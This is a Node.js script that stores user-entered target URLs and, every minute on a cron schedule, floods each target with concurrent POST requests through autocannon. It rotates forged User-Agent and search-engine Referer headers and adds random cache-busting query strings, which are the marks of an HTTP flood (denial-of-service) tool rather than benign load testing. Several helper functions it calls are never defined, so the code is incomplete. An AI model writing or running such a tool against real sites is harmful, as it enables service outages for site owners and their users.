const cron = require('node-cron');
const autocannon = require('autocannon');
const inquirer = require('inquirer');
const chalk = require('chalk');
const sqlite3 = require('sqlite3').verbose();

// Database setup
const db = new sqlite3.Database('./targets.db', (err) => {
    if (err) {
        console.error('Error opening database:', err.message);
    } else {
        console.log('Connected to the SQLite database.');
    }
});

// Create table if not exists
db.serialize(() => {
    db.run(`
      CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT,
        path TEXT,
        port INTEGER,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);
});

let isTestRunning = false; // Flag to track if autocannon is running

// List of User-Agent strings
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
    // Add more User-Agents as needed
];

// List of Referer URLs
const referers = [
    'http://www.google.com/?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://www.bing.com/search?q=',
    'http://duckduckgo.com/?q=',
    'http://www.ask.com/web?q='
    // Add more Referers as needed
];

// Function to get a random item from an array
function getRandomItem(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Function to generate random string
function buildRandomString(size) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < size; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

// Function to generate exactly 1024 bytes of body data
function generateExactSizeBody(size) {
    let largeBody = '';
    while (Buffer.byteLength(largeBody) < size) {
        largeBody += `{"data":"${buildRandomString(100)}"},`; // Add random strings to increase size
    }
    if (Buffer.byteLength(largeBody) > size) {
        largeBody = largeBody.slice(0, size - 2); // Adjust to fit the size while maintaining JSON structure
        largeBody += '}'; // Close the JSON string properly
    }
    return `{ "payload": [ ${largeBody} ] }`;
}

// Function to run the Autocannon test
async function runAutocannonTest(url, port, path) {
    if (isTestRunning) {
        console.log(chalk.yellow('Test is already running.'));
        return;
    }

    isTestRunning = true; // Set the flag to true
    try {
        const fullUrl = `http://${url}:${port}${path}`;
        console.log(chalk.blue(`Starting autocannon test on ${fullUrl}`));

        const largeBody = generateExactSizeBody(1024); // 1024 bytes payload

        const instance = autocannon({
            url: fullUrl, // Target URL with path
            title: 'talkingchat', // Test title
            connections: 100, // Number of concurrent connections
            pipeline: 1, // Number of pipelined requests
            workers: 2, // Number of worker threads
            requests: [
                {
                    method: 'POST', // HTTP method (POST to send body data)
                    path: `/?${buildRandomString(10)}=${buildRandomString(10)}`, // Random query parameters
                    headers: {
                        'User-Agent': getRandomItem(userAgents),
                        'Referer': getRandomItem(referers),
                        'Cache-Control': 'no-cache',
                        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/json', // JSON body
                        'Content-Length': Buffer.byteLength(largeBody)
                    },
                    body: largeBody // Include large body data
                }
            ]
        }, handleResults);

        instance.on('start', () => console.log(chalk.green("Test Started!")));
        instance.on('tick', () => console.log(chalk.yellow('Ticking...')));
        instance.on('response', handleResponse);

        autocannon.track(instance, { renderProgressBar: false });

    } catch (err) {
        console.error(chalk.red("An error occurred during the test:", err));
    } finally {
        isTestRunning = false; // Reset the flag
    }
}

// Handle responses during the test
function handleResponse(client, statusCode, resBytes, responseTime) {
    console.log(chalk.cyan(`Got response with code ${statusCode} in ${responseTime} milliseconds`));
    console.log(chalk.cyan(`Response: ${resBytes.toString()}`));

    // Modify the headers or body of the client if needed
    client.setHeaders({ new: 'header' });
    client.setBody('new body');
    client.setHeadersAndBody({ new: 'header' }, 'new body');
}

// Handle the results after the test completes
function handleResults(err, result) {
    if (err) {
        console.error(chalk.red("An error occurred during the test:", err));
        return;
    }
    console.log(chalk.magenta(result));
}

// Main function to start or resume target processing
async function main() {
    const targets = await getTargets();
    if (targets.length === 0 || targets.every(target => !target.url)) {
        await promptUserForTarget();
    } else {
        console.log(chalk.yellow('Existing targets found. Running tests on them...'));
        for (const target of targets) {
            await runAutocannonTest(target.url, target.port, target.path);
        }
    }
}

// Schedule the function to run periodically using node-cron
cron.schedule('*/1 * * * *', async () => {
    console.log(chalk.yellow('Checking if test needs to be started...'));
    await main();
});

// Define other necessary functions...
async function getTargets() {
    return new Promise((resolve, reject) => {
        db.all(`SELECT * FROM targets ORDER BY timestamp DESC`, [], (err, rows) => {
            if (err) {
                reject(err);
            } else {
                resolve(rows);
            }
        });
    });
}

async function getCurrentTarget(id) {
    return new Promise((resolve, reject) => {
        db.get(`SELECT * FROM targets WHERE id = ?`, [id], (err, row) => {
            if (err) {
                reject(err);
            } else {
                resolve(row);
            }
        });
    });
}

async function saveTarget(url, path, port) {
    return new Promise((resolve, reject) => {
        db.run(
            `INSERT INTO targets (url, path, port) VALUES (?, ?, ?)`,
            [url, path, port],
            function (err) {
                if (err) {
                    reject(err);
                } else {
                    resolve(this.lastID); // Return the ID of the inserted row
                }
            }
        );
    });
}

async function promptUserForTarget() {
    const targets = await getTargets();
    const choices = targets.map(target => ({
        name: `${target.url}:${target.port}${target.path}`,
        value: target.id,
    }));

    const answers = await inquirer.prompt([
        {
            type: 'list',
            name: 'targetId',
            message: 'Select a target:',
            choices: choices.length ? choices : ['No targets available'],
        },
        {
            type: 'list',
            name: 'command',
            message: 'Select a command:',
            choices: [
                'Run Tests on All Targets',
                'Show History Logs',
                'Show Current Target',
                'Update Target',
                'Delete Target',
                'Set New Target'
            ],
        }
    ]);

    if (answers.command === 'Run Tests on All Targets' && !isTestRunning) {
        isTestRunning = true;
        await runTestsOnAllTargets();
        isTestRunning = false;
    } else if (answers.command === 'Show History Logs') {
        await showHistoryLogs();
    } else if (answers.command === 'Show Current Target') {
        await showCurrentTarget();
    } else if (answers.command === 'Update Target') {
        await updateSelectedTarget();
    } else if (answers.command === 'Delete Target') {
        await deleteSelectedTarget();
    } else if (answers.command === 'Set New Target') {
        const { url, path, port } = await inquirer.prompt([
            {
                type: 'input',
                name: 'url',
                message: 'Enter the target URL:',
                validate: value => /^((https?|ftp):\/\/)?([a-zA-Z0-9.-]+)(:\d{1,5})?(\/.*)?$/.test(value) || 'Please enter a valid URL',
                filter: String
            },
            {
                type: 'input',
                name: 'path',
                message: 'Enter the target path:',
                default: '/',
                validate: value => /^\/[a-zA-Z0-9\/\-_.~%!$&'()*+,;=:@]*$/.test(value) || 'Please enter a valid path',
                filter: String
            },
            {
                type: 'input',
                name: 'port',
                message: 'Enter the target port:',
                default: 80,
                validate: value => /^\d+$/.test(value) || 'Please enter a valid port number',
                filter: Number
            }
        ]);

        const id = await saveTarget(url, path, port);
        console.log(chalk.green(`New target added with ID ${id}`));
    }
}

// Define other functions such as showHistoryLogs, showCurrentTarget, updateSelectedTarget, deleteSelectedTarget...

